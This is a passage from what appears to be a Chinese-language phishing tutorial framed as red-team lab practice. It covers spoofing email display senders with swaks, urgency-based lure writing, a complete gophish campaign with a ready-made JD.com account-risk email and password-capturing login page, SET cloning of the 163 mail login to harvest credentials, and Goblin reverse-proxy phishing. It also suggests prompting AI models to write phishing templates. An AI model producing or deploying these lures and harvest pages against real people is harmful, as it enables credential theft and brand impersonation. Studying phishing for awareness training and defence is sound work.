#### 3.1.4 实操
**1.eml 简单示例：**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782786015_wy6lkc.webp)

把这个文件放到 kali 桌面

执行命令：

```bash
swaks --to 37xxxx@qq.com --from xxx@163.com --data /home/kali/Desktop/1.eml --server smtp.163.com -p 25 -au xxx@163.com -ap xxx
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782787743_x3j6x3.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782789633_om5vn6.webp)

> **问题：eml 模板加载异常  **
>
> **原因：Swaks 新旧版本 **`**--data**`** 参数语法变更**
>
> Swaks 在 **20240103.0 版本进行重大语法调整**，也是复现邮件伪造极易踩坑的点：
>
> 1. **旧版 Swaks**：`--data 1.eml`，直接填写文件名，程序自动识别并读取 eml 模板；
> 2. **新版 Swaks**：取消自动识别机制。想要加载本地 eml 文件，必须增加`@`标识：`--data @1.eml`；如果不加`@`，程序会把`1.eml`当成普通文本字符串，不会读取模板文件，伪装昵称、HTML 内容全部失效。
>

```plain
 # 查看swaks版本 
swaks --version  
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782791864_a3qgs1.webp)





```bash
swaks --to 37xxxx@qq.com --from xxx@163.com --data @1.eml --server smtp.163.com -p 25 -au xxx@163.com -ap xxx
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782793957_42xmh3.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782796051_gz27pj.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782797763_9ssz3y.webp)





### 3.3 实验测试：
#### 3.3.1 改 `--from`（信封发件人），账号`-au`不变
`553 Mail from must equal authorized user`，发送失败

结论：使用 163 等商用邮箱 SMTP 代发，协议层信封发件人（`--from`）必须和登录账号保持一致，修改会返回 553 错误，无法直接伪造；仅邮件正文头部的发件显示信息可伪造（即 1.eml 文件内），用于迷惑普通收件用户。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782799158_qqlb19.webp)

#### 3.3.2 修改 `-au` 登录账号，授权码和信封发件人都不变
`-au` 更换成别的邮箱账号，授权码还是原来账号的授权码 

结果：`550 User has no permission` 登录失败

结论： SMTP授权码**一对一绑定邮箱账号**，账号和授权码必须配套。 授权码本质就是该账号专用第三方登录凭证，账号换了，凭证失效。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782800712_5k6a9e.webp)

### 3.4 信封From vs 邮件头部From
#### 3.4.1 信封From（MAIL FROM）｜SMTP协议层
+ **是谁用：SMTP通信协议，邮件服务器之间交互----****<font style="color:#DF2A3F;">信封发件人</font>**
+ **对应swaks参数：**`**--from**`
+ **作用：邮件投递路由、服务器校验、反垃圾校验**
+ **可见位置：邮件原始源码 → **`**Return‑Path**`**字段**
+ **163/QQ邮箱行为：强制等于登录账号(**`**‑au**`**)，不一致直接返回**`**553 Mail from must equal authorized user**`**，发送失败**

---

#### 3.4.2 邮件头部From（Header From）｜邮件内容层
+ **是谁用：邮件内容，给邮件客户端(QQ邮箱、网易邮箱网页版)渲染展示----****<font style="color:#DF2A3F;">展示发件人</font>**
+ **对应位置：写在**`**.eml**`**文件内部头部 **`**From:**`

```plain
From:"安全告警中心" <fake@hack.com>
```

+ **作用：收件人网页/APP看到的“发件人名称+邮箱”**
+ **163/QQ邮箱行为：允许随意伪造**，不会拦截。

---

✅最终效果：

+ 服务器校验通过，可以发出去。
+ 收件人页面看到**展示发件人**：`官方客服 <fake@test.com>`
+ 但是查看邮件**原始源码**，`Return‑Path`依然是真实的`real@163.com`，专业人员可以溯源到**信封发件人**。

#### 3.4.3 字段理解
| 字段 | 归属 | 作用 |
| --- | --- | --- |
| **MAIL FROM** | 信封层 (协议) | **信封发件人**；用于投递校验，对应源码`Return‑Path`，swaks 的`--from`<br/>参数，商用邮箱不允许伪造 |
| RCPT TO | 信封层 (协议) | **信封收件人**；真实要发给谁，实际投递目标，swaks 的`--to`<br/>参数 |
| From: xxx | 邮件 Header 头部 | **展示发件人**；邮箱页面显示给用户看的，可伪造（写在 eml 文件里面） |
| To: xxx | 邮件 Header 头部 | **展示收件人**；页面上显示的收件人，可伪造 |


---

### 3.5 软刚伪造 VS 硬刚伪造
| 项目 | 软刚伪造（打字眼） | 硬刚伪造（转发突破） |
| --- | --- | --- |
| 核心 | **欺骗人眼，视觉钓鱼** | **欺骗SPF服务器，SMTP中转** |
| SPF处理 | 不触碰目标SPF域名，直接放行 | 借助第三方服务商IP，**绕过SPF** |
| 发包来源 | Kali本机直接发包 | 登录第三方邮箱官方SMTP服务器中转 |
| 信封from | 攻击者伪造形近域名 | 必须和登录SMTP的账号保持一致 |
| 伪装点 | `--from "中文昵称<伪造域名>"`，命令行直接写 | 伪装内容写在`.eml`模板文件 |
| 前置条件 | 无，直接swaks发送 | 需要第三方邮箱账号、POP3/SMTP授权码 |
| DKIM | 不受DKIM影响 | DKIM开启会被拦截 |


1. SPF只校验**信封发件人、发送服务器IP**，**不校验显示昵称**。
2. 软刚：骗用户眼睛；硬刚：借第三方邮箱服务器骗SPF。
3. 硬刚的信封地址不能随便改，伪装内容放到eml模板。
4. 163等邮箱使用SMTP，填**授权码**，不是网页登录密码。

---

# 三、伪造钓鱼邮件的内容
## 1. 钓鱼邮件文案三要素
1. **重要性** 制造事件重要感，吸引目标打开邮件。

> 例子：账号异常、工资条、合同、告警通知、待处理工单。
>

2. **合理性** 内容贴合目标身份、岗位、公司业务，逻辑符合日常场景，降低对方警惕。

> 例子：给财务就写发票、付款通知；给员工写OA系统、人事通知。如果内容和接收人工作完全不沾边，很容易被识破。
>

3. **紧迫性** 制造时间压力，逼迫受害者快速操作，不给思考、核实的时间。

> 话术参考：**24小时内过期、一小时内需处理、超时账号冻结、立即核验**，诱导立刻点击链接、输入账号密码、下载附件。
>



**Q：钓鱼邮件文案为什么要加紧迫性？** 

**A：压缩受害者思考时间，来不及向官方核实，提高上钩概率。**

---

## 2. 案例
### 2.1 系统更新迁移
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782802209_g0m51a.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782803575_qyzply.webp)

### 2.2 账号异常登录
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782805487_qvyupu.webp)

### 2.3 账号密码过期
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782806733_53oi2a.webp)

### 2.4 针对学校
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782809330_ifloqd.webp)

## 3. AI 技术的应用
利用AI大模型直接生成钓鱼邮件模板：

关键词：

+ 帮我生成一份工作汇报邮件模板
+ 帮我生成一份公司重要通知的邮件模板
+ 帮我把这份邮件模板导出为HTML的前端页面，并给出源代码 
+ ...... 



## 4. 钓鱼邮件工具学习--gophish
### 4.1 介绍
#### 4.1.1 基础介绍
+ 项目地址：[https://github.com/gophish/gophish](https://github.com/gophish/gophish)
+ 开发语言：Go语言
+ **定位：端‑到‑端完整邮件钓鱼演练平台（一体化全套工具）**

---

#### 4.1.2 两大端口
启动后开放两个独立服务

1. **管理后台端口：3333（默认HTTPS）** 你登录控制面板，配置所有钓鱼任务；管理员访问
2. **钓鱼网站端口：80（HTTP）** 受害者点击邮件内链接访问的钓鱼页面

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782811436_psbgha.webp)

---

#### 4.1.3 五大核心模块
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782813257_ssw9yd.webp)

1. **Sending Profiles（发送配置文件）**

填写SMTP发信服务器信息

+ 自建邮件服务器、QQ邮箱、163邮箱SMTP都可以填在这里
+ 定义伪造的**发件人地址**



2. **Email Templates（邮件模板）**

编写钓鱼邮件正文、标题、附件；可视化HTML编辑器，一键插入钓鱼链接。

邮件会自带追踪像素，记录**受害者有没有打开邮件**。



3. **Landing Pages（落地页 / 钓鱼网页）**

存放登录钓鱼页面，2种导入方式：

+ **一键克隆目标网页（静态克隆，一次性下载页面源码）**
+ 导入你本地提前写好的`login.html`自制表单页



4. **Users & Groups（目标用户组）**

批量导入一批受害者邮箱地址，做成目标列表，实现**批量群发钓鱼邮件**。

SET只能少量发送；Gophish天生面向大批量演练。



5. **Campaigns（钓鱼活动/任务）**

把上面4项全部绑定在一起，一键启动钓鱼任务。 启动之后自动后台发送邮件。

---

#### 4.1.4 仪表盘 Dashboard（最强大功能）
实时可视化监控受害者全部行为轨迹，自动生成报表：

1. 📩 Email Sent ——邮件已发出
2. 👁 Email Opened ——受害者打开了钓鱼邮件
3. 🔗 Clicked Link ——点击钓鱼链接
4. 🔑 Submitted Data ——提交账号密码，成功收割凭证 所有记录带时间线，支持导出PDF演练报告，适合企业红蓝对抗、安全培训报告输出

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782815512_brj24x.webp)

---

### 4.2 实操
#### 4.2.1 打开 gophish.exe
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782817529_3syx4m.webp)

#### 4.2.2 浏览器访问，输入账号密码后修改
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782819217_zxisxn.webp)

username：admin

password：fac9b0b49d76aafe

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782820549_qho7n3.webp)

重置账号密码

admin123 admin123

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782822771_2dmxld.webp)

---

#### 4.2.3 新建发送配置文件--攻击者邮箱信息
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782826208_xk3wxm.webp)

#### 4.2.4 测试发送邮件
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782828306_b397w4.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782830465_58aghu.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782832589_d38c48.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782834451_qzccl0.webp)

---

#### 4.2.5 导入电子邮件模板
Name：京东风控告警模板  
Envelope Sender：**保持空白**（交给 SMTP 配置管理，避免 553 报错）  
Subject：`【京东安全中心】您的账号存在异地登录风险，请完成核验`  
编辑模式切换 HTML，粘贴下方代码：

```html
<div style="font-family:Microsoft YaHei;max-width:650px;margin:auto;">
    <div>
        <img alt="京东" src="https://img14.360buyimg.com/imagetools/jfs/t1/208625/21/25633/42641/647d2293F261f4930/34c279394f06d358.png" width="130">
    </div>
    <p>尊敬的 &#123;&#123;.FirstName&#125;&#125;：</p>
    <p>京东风控系统监测到您的账号出现异地陌生登录记录，存在盗号、白条资金被盗风险。</p>
    <p>请尽快完成安全身份核验，锁定账户安全。</p>

    <div style="margin:35px 0;">
        <a href="&#123;&#123;.URL&#125;&#125;" style="background:#E6162D;color:#fff;padding:13px 32px;text-decoration:none;border-radius:3px;font-size:15px;">前往安全验证</a>
    </div>

    <p style="color:#444;">⚠️时效提醒：本次风险核验有效期仅剩2小时，超时系统将限制下单与支付功能！</p>
    <hr style="margin:30px 0;border:none;border-top:1px solid #eee;">
    <p style="font-size:13px;color:#777;">
        本消息由京东安全系统自动推送，请勿直接回复<br>
        官方客服：400-606-5500
    </p>
</div>

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782837084_s00iyn.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782839450_sxycb7.webp)

点击 **Source** 按钮，**退出源码编辑模式，**这时编辑器预览就看不到`<div>`标签，会渲染出红色的「前往安全验证」按钮。



---

#### 4.2.6 配置登录页面
 新建 Landing Page，名称：京东登录核验页 

✅务必勾选：**Capture Submitted Data（捕获表单数据）、 Capture Passwords  **

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>京东-账号登录</title>
    <style>
      *{font-family:Microsoft YaHei;box-sizing:border-box;}
      .box{width:340px;margin:60px auto;}
      h2{color:#e6162d;text-align:center;}
      input{width:100%;padding:11px;margin:8px 0;border:1px solid #ddd;border-radius:3px;font-size:15px;}
      button{width:100%;padding:11px;background:#e6162d;color:white;border:none;font-size:16px;border-radius:3px;margin-top:10px;}
    </style>
  </head>
  <body>
    <div class="box">
      <h2>账号安全核验</h2>
      <form method="POST">
        <input type="text" name="username" placeholder="手机号/用户名" required>
        <input type="password" name="password" placeholder="登录密码" required>
        <button type="submit">确认核验</button>
      </form>
      <p style="font-size:12px;color:#888;text-align:center;margin-top:15px;">京东安全中心 ©2026</p>
    </div>
  </body>
</html>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782841278_eumoyl.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782843197_e8xpr4.webp)

---

#### 4.2.7 配置用户和组--受害者信息
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782845029_5s3yus.webp)

---

#### 4.2.8 发送伪造邮件
1. **名字**：给本次钓鱼任务起个名字，随便填，例如`京东钓鱼测试`
2. **电子邮件模板**：下拉选择刚刚做好的**京东邮件模板**
3. **登陆页面**：下拉选中写好的**京东登录钓鱼着陆页**
4. **网址：**这个就是**Gophish生成的钓鱼域名/IP地址**，也就是`&#123;&#123;.URL&#125;&#125;`变量最终生成跳转链接。
5. **发送配置文件**：下拉选中你配置好的163邮箱SMTP发件配置
6. **组**：选择刚才建好、添加了测试邮箱的**目标用户组**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782847104_049l5g.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782848801_csphxe.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782850277_rq4lgv.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782852326_aexh65.webp)

---

#### 4.2.9 测试
点击红色的「前往安全验证」按钮， 但是没有打开钓鱼页面？？？

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782854054_b7yn1g.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782856029_5eyot3.webp)

当我们在广告系列「网址」填了外部欺骗 URL（京东官网），着陆页直接废掉，不会被访问，抓不到密码。  

原理：

当广告网址填成京东 `https://jd.com`

> 邮件按钮 &#123;&#123;.URL&#125;&#125; → 生成链接 https://www.jd.com/?rid=sypN1Iu   
👉用户一点，浏览器直接访问京东官网，请求根本不会到达 Gophish   
👉着陆页从头到尾一次都不会打开，等于白建，密码捕获功能彻底失效。
>



但是我们发现填写的 url 和我们实际访问的 url 多了一个参数 `?rid=sypN1Iu`

### Q1： 为什么多出 `?rid=sypN1Iu`？
`rid` = 收件人唯一追踪 ID，**Gophish 原生强制追加，不能直接删掉**。

rid 的作用：Gophish 靠它分辨「是谁点了链接、是谁提交了账号密码」，没有 rid 就无法统计结果。



那我们这时候就要用到另一个网址：

> http://0.0.0.0:80 	着陆页面
>
> https://127.0.0.1:3333 	管理页面 
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782857767_0be9tf.webp)

访问：

```plain
http://0.0.0.0:80
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782860398_02fwqn.webp)

拼接：

```plain
http://127.0.0.1?rid=sypN1Iu
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782861601_vymbww.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782863107_fyo9y6.webp)

我们访问成功后，统计的数据变化了。

登录：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782865099_ta98ky.webp)

查看捕获的信息：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782866812_g4qr3j.webp)



<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782868766_z4qceu.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782870724_fucqpl.webp)

---

#### 4.2.10 结论
最初在广告系列网址栏填写`https://jd.com`，启动活动发送钓鱼邮件。点击邮件内链接后，页面直接跳转至京东官网，URL 末尾附带 Gophish 自动追加的`rid`追踪参数。 此时流量直接访问京东服务器，不会经过 Gophish，因此无法加载仿京东钓鱼着陆页面，不能捕获账号凭证。 

但链接中附带 Gophish 生成的有效`rid`唯一追踪标识，我们将完整 URL 内的`?rid=xxx`参数提取，构造`http://127.0.0.1/?rid=sypN1Iu`进行访问，请求到达 Gophish 服务，成功加载自制的仿京东账号核验钓鱼页面。 

该现象验证核心原理：**广告系列网址必须填写 Gophish 自身访问地址；若填写外部官网域名，受害者点击链接将直接访问第三方站点，着陆页失效。**

****

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782872311_8fzcsk.webp)

### Q2：广告系列网址栏 URL 可以填什么？
1. 外部站点

> 填外部站点（例如 `www.jd.com`）：想要看到钓鱼页面**必须手动拼接参数**，无法自动化攻击；  
>

2. 我们自己服务器，里面装了 gophish

>  填自己的 Gophish 服务器地址：受害者点击链接**可自动访问钓鱼着陆页**，不需要手动操作。  
>

### Q3：如何生成钓鱼网站？
#### Q3.1 AI 生成
#### Q3.2 克隆一个页面（另存），但是没有功能。
#### Q3.3 工具：kali 中的 setoolkit
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782873917_r1yo2t.webp)

** **

**菜单选项详解**

```plain
1) Social‑Engineering Attacks     # 社会工程攻击（最常用！网页钓鱼就在这里）
2) Penetration Testing (Fast‑Track) # 快速渗透测试
3) Third Party Modules              # 第三方模块
4) Update the Social‑Engineer Toolkit # 更新SET工具
5) Update SET configuration        # 修改SET配置
6) Help, Credits, and About        # 帮助信息
99) Exit the Social‑Engineer Toolkit # 退出SET
```

****

**SET 钓鱼网页克隆**

1. 主菜单输入 `1` →回车

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782876132_q0x06c.webp)

```plain
1) Spear‑Phishing Attack Vectors        # 鱼叉钓鱼攻击，定向发送钓鱼邮件
2) Website Attack Vectors               # 网站攻击向量【网页克隆钓鱼抓账号密码，选这个】
3) Infectious Media Generator           # 生成带诱饵的U盘/介质木马
4) Create a Payload and Listener        # 生成木马Payload + 监听端(远控)
5) Mass Mailer Attack                   # 批量群发钓鱼邮件
6) Arduino‑Based Attack Vector         # Arduino硬件攻击
7) Wireless Access Point Attack Vector  # 伪造恶意无线AP热点
8) QRCode Generator Attack Vector      # 生成钓鱼二维码
9) Powershell Attack Vectors            # Powershell脚本攻击
10) Third Party Modules                 # 第三方模块
99) Return back to the main menu.       # 返回上一级主菜单
```

---

2. 选择 `2) Website Attack Vectors`（网站攻击向量）

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782877804_mt4amx.webp)

```plain
1）Java Applet Attack Method         # Java小程序漏洞攻击（老旧，现代浏览器基本失效）
2）Metasploit Browser Exploit Method # Metasploit浏览器漏洞渗透，拿下靶机权限
3）Credential Harvester Attack Method # **凭证收割【网页钓鱼抓账号密码！选这个】**
4）Tabnabbing Attack Method          # 标签劫持攻击，后台偷换网页标签
5）Web Jacking Attack Method         # 网页劫持，伪造弹窗诱导点击
6）Multi‑Attack Web Method           # 多攻击组合，同时开启凭证收割+浏览器漏洞
7）HTA Attack Method                 # HTA文件钓鱼，执行恶意脚本
99）Return to Main Menu              # 返回主菜单
```

---

3. 选择 `3) Credential Harvester Attack Method`（凭证收割，抓账号密码）

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782879445_4vcndk.webp)

```plain
1）Web Templates        # SET内置现成钓鱼网页模板（Facebook、Google等）
2）Site Cloner          # 网站克隆
3）Custom Import        # 导入自己写好的钓鱼网页，目录里只能放index.html
99）Return to Webattack Menu  # 返回上一级网站攻击菜单
```

---

4. 选择 `2) Site‑Cloner`（网站克隆）

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782881366_5mbto2.webp)

---

5. 输入你 Kali 本机局域网 IP `192.168.23.131`, 这里直接回车（使用默认 IP `192.168.23.131`）  

---

6. 输入要克隆的网址，例如`https://mail.163.com/`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782883645_f9gng3.webp)

> 开启监听，别人访问你的 KaliIP，打开克隆好的假登录页，提交账号密码就会在终端打印出来
>

---

7. 访问

```plain
http://192.168.23.131
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782885921_xh68hf.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782887961_fzk6at.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782889742_2osgzs.webp)

---

### Q4：为什么没能成功捕获用户名和密码？
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782892310_jy9qyo.webp)

#### Q4.1 原因
1. 在 form 里面，没有原生提交按钮`<input type="submit" value="登录">`

**HTML 结构层面** 页面仅有带 name 属性的输入框，**不存在原生**`**<form>**`**表单标签与原生 submit 提交按钮**，浏览器无法自动打包表单数据发送。

2. `data-action="dologin"`：触发名字叫`dologin()`的登录函数 → **AJAX 异步发包**，账号密码发送给网易服务器。  

SET Credential Harvester **只捕获标准 HTML Form 表单 POST 提交**。  
现代网站（163、京东、有道云等登录页）全部使用 **AJAX / JavaScript 异步提交**。  
点击登录时，直接把账号密码发送给官方真实服务器，**数据不会发到 Kali 钓鱼地址** → Kali接收不到任何信息。

---

#### Q4.2 捕获失败流程
1. 点击【登录】按钮（红框 a 标签）
2. 触发 JS 函数`dologin()`
3. JS 读取`name="email"`和`name="password"`输入框的值
4. AJAX 请求 → 发送数据包到网易官方服务器
5. 页面局部刷新，弹出 “账号密码错误” 提示，**页面不整体跳转刷新**
6. 数据包**完全绕开 Kali SET 服务器** → Kali 抓不到账号密码

---

#### Q4.3 解决方案一：自制可被 SET 捕获的登录页面
 1.  新建`gofishing.html`：

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>账号登录</title>
  </head>
  <body>
    <!--关键：不加action，表单就会自动POST提交回SET服务器-->
    <form method="POST">
      <div>
        <label>邮箱账号</label>
        <input type="text" name="email" placeholder="邮箱账号或手机号码">
      </div>
      <br>
      <div>
        <label>登录密码</label>
        <input type="password" name="password" placeholder="输入密码">
      </div>
      <br>
      <input type="submit" value="登录">
    </form>
  </body>
</html>
```

---

2. SET 克隆自制网页：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782894513_dib12t.webp)

---

3. 克隆自制网页：

```plain
http://192.168.2.101:81/gofishing.html
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782896148_6jd3m6.webp)

---

4. 访问：

```plain
http://192.168.23.131/
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782898039_gb0gf9.webp)

---

5. 成功捕获账号密码！！！

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782899548_5wwhmd.webp)

---

#### Q4.4 解决方案二：网页另存本地 + 修改源码
流程

1. 浏览器打开163登录页面 → 右键【另存为】，把网页完整保存到本地电脑，得到html文件+配套资源文件夹
2. 使用记事本/VS Code打开下载好的`.html`源码
3. 针对性修改3处核心代码  
 ① 找到前文中我们提到的红框这个登录按钮代码：  
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782901365_8vqnax.webp)  
 直接删除这一行。  
 ② 在form标签内部，新增原生表单提交按钮```

```plain
<input type="submit" value="登录">
```

 ③ 清除页面中远程加载的外部JS（所有 `src="https://xxx.163.com/xxx.js"` 的script标签），杜绝远程下载网易登录脚本。

    1. 保存修改后的html文件
    2. 打开SET工具，克隆( Site‑Cloner) / 本地导入(Custom Import)

---

#### Q4.5 结论
将网页另存至本地修改需要移除JS登录触发按钮、删除远程外部脚本、新增原生submit提交按钮；该方案仿真程度更高，但操作繁琐，极易因残留JS导致捕获失败，靶场实验优先推荐自制表单页面。

---

#### Q3.4 网页伪造工具：Goblin
+ 工具定位：**红队反向代理钓鱼工具（Reverse‑Proxy‑Phishing）**
+ 核心本质：**轻量反向代理服务器，≠网站克隆工具**
+ 项目下载地址：[https://github.com/xiecat/goblin](https://github.com/xiecat/goblin)
+ 原理：

```plain
受害者浏览器 → 访问 Goblin钓鱼端口
        ↓
Goblin接收HTTP请求，原样转发流量给【后端源站】
        ↓
后端源站返回页面数据 → Goblin再返回给受害者
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782903035_zevkjl.webp)

---

1. 查看配置文件 `goblin.yaml`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782905423_mrn3ii.webp)

---

2. 访问 `127.0.0.1:8083`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782907719_y44egq.webp)

---

3. 访问 `127.0.0.1:8084`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782909842_tqxz4p.webp)

尝试搜索一下

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782912046_onruuh.webp)

---

4. 我们自己来配置一个 `127.0.0.1:8085`，就克隆我们之前自制的网页吧

注意：首先要启动我们的 phpstudy

本机的 IP 是：192.168.2.101

访问：`http://192.168.2.101:81/`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782914190_099jpo.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782915515_vie8gp.webp)

`http://192.168.2.101:81/gofishing.html`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782916834_w8ldbf.webp)

---

5. 重新启动 goblin.exe

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782918582_ry0n6g.webp)

---

6. 访问

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782920703_lbntd0.webp)

### Q5：Goblin 为什么会把 PHPStudy 全站暴露？
1. Goblin 是 **反向代理**，不是克隆工具
2. ProxyPass 只是指定「后端服务器」，**不限制访问路径**



